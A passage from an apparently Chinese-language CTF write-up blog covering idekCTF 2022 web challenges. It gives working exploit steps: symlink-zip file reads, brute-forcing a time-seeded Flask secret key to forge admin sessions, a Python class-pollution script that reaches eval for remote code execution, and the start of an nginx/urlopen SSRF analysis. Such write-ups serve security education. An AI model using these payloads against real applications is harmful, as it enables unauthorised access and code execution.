+<p>这里使用了random.seed()来设置随机数种子，只要参数一样，randint()获得的数值都是一样的，所以只要得到了题目当时的种子，就可以爆破出secret_key</p>
+<p>而在random.seed里，是使用了<code>time.time()</code>作为参数的内容之一</p>
+<blockquote>
+<p>time.time()返回当前时间的时间戳（1970纪元后经过的浮点秒数）</p>
+</blockquote>
+<p>然后将最终的结果使用<code>round()</code>四舍五入取整</p>
+<p><code>app.py</code></p>
+<p>关键代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">uuidpath = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">filename = <span class="string">f&quot;<span class="subst">&#123;DATA_DIR&#125;</span>uploadraw/<span class="subst">&#123;uuidpath&#125;</span>.zip&quot;</span></span><br><span class="line">file.save(filename)</span><br><span class="line">subprocess.call([<span class="string">&quot;unzip&quot;</span>, filename, <span class="string">&quot;-d&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;DATA_DIR&#125;</span>uploads/<span class="subst">&#123;uuidpath&#125;</span>&quot;</span>])    </span><br><span class="line">flash(<span class="string">f&#x27;Your unique ID is &lt;a href=&quot;/uploads/<span class="subst">&#123;uuidpath&#125;</span>&quot;&gt;<span class="subst">&#123;uuidpath&#125;</span>&lt;/a&gt;!&#x27;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">logger.info(<span class="string">f&quot;User <span class="subst">&#123;session.get(<span class="string">&#x27;uid&#x27;</span>)&#125;</span> uploaded file <span class="subst">&#123;uuidpath&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">&quot;/upload&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里是在将文件上传后再进行解压到<code>&#123;DATA_DIR&#125;uploads/&#123;uuidpath&#125;</code>文件夹</p>
+<p>这里解压的方式是使用unzip，而zip提供了压缩符号链接文件的方法<code> zip --symlinks a.zip a.link</code></p>
+<h2 id="0x02-题解"><a href="#0x02-题解" class="headerlink" title="0x02 题解"></a>0x02 题解</h2><p>根据上面的分析</p>
+<p>我们需要获得当时的<code>时间戳</code>以及<code>SECRET_OFFSET</code>的值</p>
+<p>所以我们要去获取config.py和server.log（因为这个是日志文件，记录了服务开启的时间，而在服务开启的时候就是执行config.py代码的时候）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /tmp/server.log server</span><br><span class="line">zip --symlinks server.zip server</span><br><span class="line"><span class="built_in">ln</span> -s /app/config.py config</span><br><span class="line">zip --symlinks config.zip config</span><br></pre></td></tr></table></figure>
+
+<p>上传上去后访问对应的文件，可以将文件下载下来，获取文件的内容</p>
+<p>先从config.py获得<code>SECRET_OFFSET</code>的值，为<code>-67198624</code></p>
+<p>然后从server.log获取时间戳</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[2023-01-16 23:13:22 +0000] [8] [INFO] Starting gunicorn 20.1.0</span><br><span class="line">[2023-01-16 23:13:22 +0000] [8] [INFO] Listening at: http://0.0.0.0:1337 (8)</span><br><span class="line">[2023-01-16 23:13:22 +0000] [8] [INFO] Using worker: <span class="built_in">sync</span></span><br><span class="line">.......................................................</span><br></pre></td></tr></table></figure>
+
+<p>在网上进行转换，要注意，有些网站会自动将这个时间识别为utf+8，但是题目上的utf+0的</p>
+<p>得到时间戳<code>1673910802</code></p>
+<p>我是使用flask-unsign进行爆破，所以先写字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">start=<span class="number">1673910790</span></span><br><span class="line">end=<span class="number">1673910805</span></span><br><span class="line"><span class="comment">#timestamp=1673910802</span></span><br><span class="line">SECRET_OFFSET = -<span class="number">67198624</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;key.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> start&lt;end:</span><br><span class="line">    <span class="comment"># start=round(start,3)</span></span><br><span class="line">    <span class="built_in">print</span>(start)</span><br><span class="line">    random.seed(<span class="built_in">round</span>((start + SECRET_OFFSET) * <span class="number">1000</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">round</span>((start + SECRET_OFFSET) * <span class="number">1000</span>))</span><br><span class="line">    secret_key = <span class="string">&quot;&quot;</span>.join([<span class="built_in">hex</span>(random.randint(<span class="number">0</span>, <span class="number">15</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># f.write(secret_key+&#x27;\n&#x27;)</span></span><br><span class="line">    start+=<span class="number">0.001</span></span><br></pre></td></tr></table></figure>
+
+<p>然后使用flask-unsign</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/tools/flask-unsign]</span><br><span class="line">└─$ flask-unsign  --unsign -w key.txt --cookie  <span class="string">&#x27;eyJhZG1pbiI6ZmFsc2UsInVpZCI6IjEyMzQifQ.Y8a8uQ.E77ORPZ53Oy4DNkqoJqtZYct4sc&#x27;</span> -t 100</span><br><span class="line">[*] Session decodes to: &#123;<span class="string">&#x27;admin&#x27;</span>: False, <span class="string">&#x27;uid&#x27;</span>: <span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">[*] Starting brute-forcer with 100 threads..</span><br><span class="line">[+] Found secret key after 12800 attemptsd7e6630f3f7a</span><br><span class="line"><span class="string">&#x27;074cce10940b886e3089f27a878577cd&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>获得secret_key:<code>074cce10940b886e3089f27a878577cd</code></p>
+<p>再使用获得的secret_key伪造session</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/tools/flask-unsign]</span><br><span class="line">└─$ flask-unsign  --sign --secret <span class="string">&#x27;074cce10940b886e3089f27a878577cd&#x27;</span> --cookie  <span class="string">&quot;&#123;&#x27;admin&#x27;:True,&#x27;uid&#x27;:&#x27;1234&#x27;&#125;&quot;</span>    </span><br><span class="line">eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTIzNCJ9.Y8bNxA.awZ8Y_QZeUjPzoB_3MHcflCUtVI</span><br></pre></td></tr></table></figure>
+
+<p>利用这个session去访问<code>/flag</code>获得flag</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301180034375.png" title="image-20230118003447267" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301180034375.png" alt="image-20230118003447267"></a></p>
+<h1 id="Web-task-manager-复现"><a href="#Web-task-manager-复现" class="headerlink" title="Web&#x2F;task manager(复现)"></a>Web&#x2F;task manager(复现)</h1><h2 id="0x00-3"><a href="#0x00-3" class="headerlink" title="0x00"></a>0x00</h2><p>参考链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#%E5%A7%BF%E5%8A%BF2-1">Y4爷</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager">老外的wp</a></li>
+</ul>
+<hr>
+<p>利用类似python版本的原型链污染（即<strong>类污染</strong>），通过对属性的修改，来造成rce或任意文件读取</p>
+<p>作者是借鉴了这个文章的内容:<a target="_blank" rel="noopener" href="https://blog.abdulrah33m.com/prototype-pollution-in-python/">Prototype Pollution in Python</a>。</p>
+<p>利用pydash模块的<code>pydash.set_</code>对来设置或覆盖属性值，可以设置路径</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line">a=&#123;&#125;</span><br><span class="line">pydash.set_(a,<span class="string">&#x27;a.b.c&#x27;</span>,<span class="number">123</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#&#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 123&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>而本题存在一个TaskManager类，里面定义了一个函数，会调用pydash.set_</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">self, task, status</span>):</span><br><span class="line">    <span class="keyword">if</span> task <span class="keyword">in</span> self.protected:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    pydash.set_(self, task, status)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>而且task参数和status都是可控的，就可以通过TaskManager实例来对其他属性值进行修改</p>
+<h3 id="通过TaskManager得到app对象"><a href="#通过TaskManager得到app对象" class="headerlink" title="通过TaskManager得到app对象"></a>通过TaskManager得到app对象</h3><p>这个要自己调试，但是我本地调试的一直和别人的不一样 XD，所以就先不管了，先用Y4爷的路径</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app:__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01-通过eval进行rce"><a href="#0x01-通过eval进行rce" class="headerlink" title="0x01 通过eval进行rce"></a>0x01 通过eval进行rce</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">if</span> app.env == <span class="string">&#x27;yolo&#x27;</span>:</span><br><span class="line">        app.add_template_global(<span class="built_in">eval</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="重复调用-app-before-first-request"><a href="#重复调用-app-before-first-request" class="headerlink" title="重复调用@app.before_first_request"></a>重复调用@app.before_first_request</h3><p><code>before_first_request</code>，注册一个函数，该函数将在第一次请求此应用程序实例之前运行，在这里就是运行init()</p>
+<p>可以将<code>app._got_first_request</code>设置为False，来重复调用@app.before_first_request</p>
+<p>这里可以看到，当app.env等于’yolo’时就会调用<code>add_template_global(eval)</code>，将eval()函数注册为模板全局函数，这样就可以使用<code>&#123;&#123;eval(xxxx)&#125;&#125;</code>的方式来调用eval函数</p>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.env&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;yolo&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app._got_first_request&quot;</span>,<span class="string">&quot;status&quot;</span>:False&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>因为flask在识别路径的时候会检测是否有<code>..</code>，在源码中就是<code>os.path.pardir</code>的值，如果存在这个值，就会报错</p>
+<p>只要人为修改这个的值，就可以绕过检测,这个也要自己调试</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242056629.png" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242056629.png"></a></p>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;__class__.__init__.__globals__.__loader__.__init__.__globals__.sys.modules.os.pardir&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;None&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="修改闭合字符串"><a href="#修改闭合字符串" class="headerlink" title="修改闭合字符串"></a>修改闭合字符串</h3><p>在jinja里，默认识别模板的字符串的<code>&#123;&#123;`和`&#125;&#125;</code></p>
+<blockquote>
+<p>block_start_string</p>
+<p>标记块开始的字符串。默认为<code>&#39;&#123;%'`.
+>
+> block_end_string
+>
+> 标记块结束的字符串。默认为`'%&#125;&#39;</code>.</p>
+<p>variable_start_string</p>
+<p>标记打印语句开始的字符串。默认为<code>&#39;&#123;&#123;'`.
+>
+> *variable_end_string*
+>
+> 标记打印语句结束的字符串。默认为 `'&#125;&#125;&#39;</code>.</p>
+</blockquote>
+<p>所以修改variable_start_string和variable_end_string的值，就可以让任意字符串作为模板识别的开始和结束</p>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;</span>,<span class="string">&quot;status&quot;</span>:xxxx<span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">&#123;&quot;</span>task<span class="string">&quot;:&quot;</span>__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string<span class="string">&quot;,&quot;</span>status<span class="string">&quot;:xxxx&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="寻找可以利用的文件，并设置闭合字符串"><a href="#寻找可以利用的文件，并设置闭合字符串" class="headerlink" title="寻找可以利用的文件，并设置闭合字符串"></a>寻找可以利用的文件，并设置闭合字符串</h3><p>因为我们最终是在模板文件里调用eval()，但是通过现有的文件无法实现，所以我们要找其他文件里面存在<code>eval()</code>代码的文件</p>
+<p>出题人提供了答案，在<code>/usr/local/lib/python3.8/turtle.py</code>里存在</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242110924.png" title="image-20230124211036873" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242110924.png" alt="image-20230124211036873"></a></p>
+<p>所以只要把variable_start_string修改为<code>\n            value = </code>，variable_end_string修改为<code>\n        else:</code></p>
+<p>这样，在通过前面的任意文件读取的时候，就会自动将eval(value)识别为模板代码，从而执行eval函数</p>
+<p>而且value的值，可以设置globals.value，在模板渲染的时候，会自动调用globals的值，所以我们可以给globals添加一个键名为value的元素</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242134490.png" title="image-20230124213445403" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242134490.png" alt="image-20230124213445403"></a></p>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag*.txt&#x27;).read()&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">baseurl=<span class="string">&quot;http://192.168.152.128:1337&quot;</span></span><br><span class="line">proxy=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">hijack_start = <span class="string">&quot;\n            value = &quot;</span></span><br><span class="line">hijack_end = <span class="string">&quot;\n        else:&quot;</span></span><br><span class="line">payload=&#123;<span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.env&quot;</span>:<span class="string">&quot;yolo&quot;</span>,</span><br><span class="line">         <span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app._got_first_request&quot;</span>:<span class="literal">None</span>,</span><br><span class="line">         <span class="string">&quot;__init__.__globals__.__spec__.__loader__.__init__.__globals__.sys.modules.os.pardir&quot;</span>:<span class="string">&quot;v2i&quot;</span>,</span><br><span class="line">         <span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;</span>:hijack_start,</span><br><span class="line">         <span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string&quot;</span>:hijack_end,</span><br><span class="line">         <span class="string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value&quot;</span>:<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag*.txt&#x27;).read()&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overwrite</span>(<span class="params">t,s</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;task&quot;</span>:t,<span class="string">&quot;status&quot;</span>:s&#125;</span><br><span class="line">    url=baseurl+<span class="string">&quot;/api/manage_tasks&quot;</span></span><br><span class="line">    requests.post(url=url,json=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(): </span><br><span class="line">    url = baseurl + <span class="string">&quot;/../../usr/local/lib/python3.8/turtle.py&quot;</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=url)</span><br><span class="line">    prep = r.prepare()</span><br><span class="line">    prep.url = url</span><br><span class="line">    r = s.send(prep)</span><br><span class="line">    flag = re.findall(<span class="string">&#x27;idek&#123;.*&#125;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> t,s <span class="keyword">in</span> payload.items():</span><br><span class="line">        overwrite(t,s)</span><br><span class="line">    get_flag()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>get_flag下面的是用的Y4爷的，可以防止requests自动将&#x2F;..&#x2F;..&#x2F;删除掉，也可以手动去发包，访问一次</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242334891.png" title="image-20230124233350740" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301242334891.png" alt="image-20230124233350740"></a></p>
+<h2 id="0x02-通过覆盖编译时需要的值进行rce"><a href="#0x02-通过覆盖编译时需要的值进行rce" class="headerlink" title="0x02 通过覆盖编译时需要的值进行rce"></a>0x02 通过覆盖编译时需要的值进行rce</h2><p>这个是一个老外的做法:<a target="_blank" rel="noopener" href="https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager">https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager</a></p>
+<p>在生成模板的过程中，<code>jinja2.compiler.CodeGenerator.visit_Template()</code>里，如果我们覆盖了exported变量就可以控制模板的生成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">visit_Template</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self, node: nodes.Template, frame: t.<span class="type">Optional</span>[Frame] = <span class="literal">None</span></span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">assert</span> frame <span class="keyword">is</span> <span class="literal">None</span>, <span class="string">&quot;no root frame allowed&quot;</span></span><br><span class="line">        eval_ctx = EvalContext(self.environment, self.name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> .runtime <span class="keyword">import</span> exported, async_exported</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.environment.is_async:</span><br><span class="line">            exported_names = <span class="built_in">sorted</span>(exported + async_exported)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exported_names = <span class="built_in">sorted</span>(exported)</span><br><span class="line"></span><br><span class="line">        self.writeline(<span class="string">&quot;from jinja2.runtime import &quot;</span> + <span class="string">&quot;, &quot;</span>.join(exported_names))</span><br></pre></td></tr></table></figure>
+
+<p>可以进行rce，将flag文件复制到一个知道文件名的文件里，然后使用任意文件读取去渲染那个文件，获得flag</p>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;get.__globals__.pydash.helpers.inspect.sys.modules.jinja2.runtime.exported[0]&quot;</span>,<span class="string">&quot;status&quot;</span>: <span class="string">&#x27;*;import os;os.system(&quot;cp /flag* /tmp/flag&quot;) #&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后用模板去渲染&#x2F;tmp&#x2F;flag来得到flag</p>
+<h1 id="Web-Proxy-Viewer-复现"><a href="#Web-Proxy-Viewer-复现" class="headerlink" title="Web&#x2F;Proxy Viewer(复现)"></a>Web&#x2F;Proxy Viewer(复现)</h1><h2 id="0x00-4"><a href="#0x00-4" class="headerlink" title="0x00"></a>0x00</h2><p>利用nginx和urllib.request.urlopen对url解析的差异性进行ssrf</p>
+<p>参考连接</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/01/16/year/2023/2023IdekCTFWriteup/#2023-IdekCTF-Writeup">Y4爷</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc3986#section-5.2.4">RFC 3986 5.2.4</a></li>
+<li><a target="_blank" rel="noopener" href="https://nokline.github.io/bugbounty/2022/09/02/Glassdoor-Cache-Poisoning.html#here-is-how-i-was-able-to-poison-the-cache-of-thousands-of-pages-in-glassdoor-with-reflected--stored-xss">downgrade师傅推荐的文章</a></li>
+</ul>
+<h2 id="0x01-源码分析-1"><a href="#0x01-源码分析-1" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><p>关键源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;10/minute&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line">    remote_addr = request.headers.get(<span class="string">&#x27;X-Forwarded-For&#x27;</span>) <span class="keyword">or</span> request.remote_addr</span><br><span class="line">    is_authorized = request.headers.get(<span class="string">&#x27;X-Premium-Token&#x27;</span>) == PREMIUM_TOKEN <span class="keyword">or</span> remote_addr == <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        page = urlopen(path, timeout=<span class="number">.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;proxy.html&#x27;</span>, auth=is_authorized)</span><br><span class="line">    <span class="keyword">if</span> is_authorized:</span><br><span class="line">        output = page.read().decode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output = <span class="string">f&quot;&lt;pre&gt;<span class="subst">&#123;page.headers.as_string()&#125;</span>&lt;/pre&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;proxy.html&#x27;</span>, auth=is_authorized, content=output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里可以知道，需要让X-Forwarded-For头为127.0.0.1才会输出urlopen去访问得到的内容</p>
+<p>这里的X-Forwarded-For是无法伪造的</p>
+<p>因为在nginx.conf里,对每个代理进行访问的时候都会在http请求头添加X-Forwarded-For</p>
+<p>$proxy_add_x_forwarded_for变量包含客户端请求头中的”X-Forwarded-For”，与$remote_addr用逗号分开，如果没有”X-Forwarded-For” 请求头，则$proxy_add_x_forwarded_for等于$remote_addr。$remote_addr变量的值是客户端的IP</p>
+<p>因为是直接取$remote_addr的值，所以这个是无法伪造的</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$http_host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span><span class="regexp"> ^~</span> /static/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$http_host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">proxy_cache</span> my_zone;</span><br><span class="line">    <span class="attribute">add_header</span> X-Proxy-Cache <span class="variable">$upstream_cache_status</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后这里可以看到。当访问的url里带有<code>/static/</code>的话，就会使用缓存，这个缓存的意思就是假设对资源&#x2F;aaaa.html进行访问了一次之后，nginx就会对此进行缓存，然后在第二次访问相同的资源时，nginx就<strong>直接返回缓存的内容给客户端</strong>而不会再去访问后端</p>
+<p>还有就是<code>urlopen()</code>会对删除访问的url里<code>#</code>后的内容，如果urlopen的url为&#x2F;etc&#x2F;passwd#asd，实际访问的则是&#x2F;etc&#x2F;passwd</p>
+<p>flask将会认为&#x2F;..&#x2F;..&#x2F;..&#x2F;static&#x2F;s为path参数，而nginx则识别不出上下文，会对其进行normalize（规范化）处理，将&#x2F;static当做url的开始</p>
